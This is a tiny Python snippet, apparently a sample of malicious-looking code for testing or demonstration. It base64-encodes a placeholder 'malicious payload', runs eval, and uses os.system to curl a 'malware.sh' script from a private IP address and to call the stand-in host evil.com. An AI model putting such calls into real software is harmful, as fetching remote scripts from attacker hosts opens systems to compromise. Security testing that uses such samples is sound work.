import os
import base64
import subprocess

encoded = base64.b64encode(b"malicious payload")
eval("print('Executing malicious code')")
os.system("curl http://192.168.1.100/malware.sh")
os.system("curl http://evil.com") 




